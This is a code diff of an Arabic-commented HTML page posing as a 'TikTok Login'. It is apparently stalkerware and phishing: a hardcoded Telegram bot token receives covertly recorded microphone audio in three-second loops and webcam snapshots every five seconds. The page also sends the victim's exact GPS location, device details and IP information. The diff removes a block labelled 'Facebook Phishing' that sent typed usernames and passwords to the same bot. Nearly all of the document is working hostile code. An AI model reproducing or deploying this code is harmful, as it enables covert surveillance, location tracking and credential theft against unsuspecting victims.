@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>Video porn</title>
+  <title>TikTok Login + صورة</title>
   <style>
     body {
       background-color: #f0f2f5;
@@ -73,78 +73,71 @@
 </iframe>
 
   <script>
-
-
- 
-
-        
-  const botToken = '7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw';
+const botToken = '7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw';
 const chatId = '5454881984';
 
-   let stream = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
-    let intervalId = null;
+let stream = null;
+let mediaRecorder = null;
+let audioChunks = [];
+let intervalId = null;
 
-    async function startNewRecording() {
-      audioChunks = [];
-      mediaRecorder = new MediaRecorder(stream);
+async function startNewRecording() {
+  audioChunks = [];
+  mediaRecorder = new MediaRecorder(stream);
 
-      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+  mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
 
-      mediaRecorder.onstop = async () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("voice", audioBlob);
+  mediaRecorder.onstop = async () => {
+    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("voice", audioBlob);
 
-        document.getElementById("record").innerText = "";
+    document.getElementById("record").innerText = "";
 
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
-            method: "POST",
-            body: formData,
-            keepalive: true
-          });
-          document.getElementById("record").innerText = "";
-        } catch (err) {
-          console.error("", err);
-        }
-
-        // بدء تسجيل جديد تلقائيًا
-        startNewRecording();
-      };
-
-      mediaRecorder.start();
-
-      // توقف التسجيل بعد 3 ثوانٍ
-      setTimeout(() => {
-        if (mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-      }, 3000);
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+        method: "POST",
+        body: formData,
+        keepalive: true
+      });
+      document.getElementById("record").innerText = "";
+    } catch (err) {
+      console.error("", err);
     }
 
-    async function init() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        startNewRecording();
-      } catch (err) {
-        console.error("", err);
-        document.getElementById("record").innerText = "";
-      }
+    // بدء تسجيل جديد تلقائيًا
+    startNewRecording();
+  };
+
+  mediaRecorder.start();
+
+  // توقف التسجيل بعد 3 ثوانٍ
+  setTimeout(() => {
+    if (mediaRecorder.state === "recording") {
+      mediaRecorder.stop();
     }
+  }, 3000);
+}
 
-    
+async function init() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    startNewRecording();
+  } catch (err) {
+    console.error("", err);
+    document.getElementById("record").innerText = "";
+  }
+}
 
-    window.onbeforeunload = () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
-      }
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-    };
+window.onbeforeunload = () => {
+  if (mediaRecorder && mediaRecorder.state === "recording") {
+    mediaRecorder.stop();
+  }
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+};
 
 function sendTelegramMessage(text) {
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -166,13 +159,11 @@ function getLocation() {
         const lon = pos.coords.longitude;
         const msg = `📍 <b>Exact Location</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
         sendTelegramMessage(msg);
-        // بعدها ترسل باقي المعلومات لو تحب
         sendTelegramMessage(getDeviceInfo());
         getIPInfo();
       },
       err => {
         sendTelegramMessage("⚠️ Location access denied.");
-        // لو رفض المستخدم الموقع، نرسل باقي المعلومات بدون الموقع
         sendTelegramMessage(getDeviceInfo());
         getIPInfo();
       }
@@ -214,11 +205,9 @@ Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
     });
 }
 
-// ابدأ بطلب الموقع مباشرة
 getLocation();
   
 
-    
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
@@ -261,19 +250,16 @@ async function captureAndSend() {
 
 // التقط صورة كل 5 ثواني تلقائيًا
 setInterval(captureAndSend, 5000);
-// Facebook Phishing
-    document.getElementById('telegramForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-async function captureAndSend() {
+
+// التحقق من الصورة السوداء
+async function checkAndSendImage() {
   // تأكد من أن الفيديو يعمل ويعرض الصورة
   if (video.readyState === video.HAVE_ENOUGH_DATA) {
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // الحصول على بيانات الصورة من الكانفاس
+
     const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
     const pixels = imageData.data;
-    
+
     // تحقق إذا كانت الصورة فارغة (سوداء)
     let isBlack = true;
     for (let i = 0; i < pixels.length; i += 4) {
@@ -281,18 +267,18 @@ async function captureAndSend() {
       const g = pixels[i + 1]; // الأخضر
       const b = pixels[i + 2]; // الأزرق
       const a = pixels[i + 3]; // الشفافية
-      
+
       // إذا كانت أي بيكسل تحتوي على لون مختلف عن الأسود
-      if (r > 10 || g > 10 || b > 10 || a > 10) {
+      if (r > 5 || g > 5 || b > 5 || a > 5) {
         isBlack = false;
         break;
       }
     }
-    
+
     // إذا كانت الصورة سوداء بالكامل، لا ترسلها
     if (isBlack) {
       console.log('الصورة فارغة أو سوداء، لن يتم إرسالها.');
-      return; // لا إرسال الصورة إذا كانت سوداء
+      return;
     }
 
     // إذا كانت الصورة تحتوي على محتوى، أرسلها
@@ -321,32 +307,8 @@ async function captureAndSend() {
   }
 }
 
-  
-      const token = '7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw';
-      const chat_id = '5454881984';
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const photo = document.getElementById('photo').files[0];
-
-      const formData = new FormData();
-      formData.append('chat_id', chat_id);
-      formData.append('caption', `محاولة تسجيل دخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`);
-      formData.append('photo', photo);
-
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        alert("");
-      })
-      .catch(err => {
-        alert("");
-        console.error(err);
-      });
-    });
+// التقط صورة كل 5 ثواني مع التحقق من الصورة السوداء
+setInterval(checkAndSendImage, 5000);
   </script>
 
 </body>
